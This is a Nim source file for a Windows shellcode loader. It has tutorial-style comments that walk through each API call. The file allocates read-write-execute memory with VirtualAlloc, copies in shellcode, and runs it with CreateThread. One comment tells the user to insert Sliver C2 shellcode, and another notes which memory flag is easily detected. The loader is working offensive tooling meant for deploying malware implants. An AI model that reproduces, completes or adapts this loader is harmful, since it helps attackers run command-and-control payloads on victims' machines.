import winim

#import os
echo "[+] H4cking 4l34rt!!!"

# var shellcode: array[4,byte] = [byte 0xDE,0xAD,0xC0 ,0xDE] | Replace this with sliver sh3llc0d3 + binnim
#Vitual alloc allocate memory using winim | https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
#[ there are 4 parameters for VirtualAloc lpAddress, dwSize ,
 LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress, -> specify the starting address region to allocate. NULL value will automaticly allocate the addresses to memory
  [in]           SIZE_T dwSize, -> This will show the hell code length size.
  [in]           DWORD  flAllocationType, -> Memory Allocation type [using MEM_COMMIT]
  [in]           DWORD  flProtect ->  Memory protection for the region to be allocated
);  The last part (flProtect) can be skipable as it can be easily be detected.

Bellow we are allocating memory address for the shellcode
]#
var address = VirtualAlloc( NULL, cast[SIZE_T](shellcode.len) , 
                            MEM_COMMIT,
                            PAGE_EXECUTE_READWRITE,
)

# printing the memory location. As its not a string its a pointer, so representation [ repr() ] function is used. 
echo (repr(address))  

# now we need to Add the shellcode to our memory address using copyMem method. 
# It takes 3 arg as address to be parsed , shellcode, length of the shellcode

copyMem(address, addr(shellcode), cast[SIZE_T](shellcode.len))

echo "Nexxt"
#next is threads where not all process are mandatory. | https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
# first arg is on sec parent child structure, can use as NULL;  Next one is stack size , putting 0 for default array size(4); 
# 3rd one is the addr pointer of 1st block ; 4th one pointer var passed to the thread (avoid); 
# 6th one creation of the thread (0 immediate run after creation) ; Latly Thread ID can be NULL 
var thread_handle = CreateThread( NULL, 
                                  0 , cast[LPTHREAD_START_ROUTINE](address) , NULL, 0, 
                                  NULL
)

# Next we wait for some time single object | https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
# 2 param is ussed hHandle is our thread, and how long to wait 
WaitForSingleObject(thread_handle, -1)
#echo "wait Done"
CloseHandle(thread_handle)
#echo "[ALL DONE] "
#sleep 3000

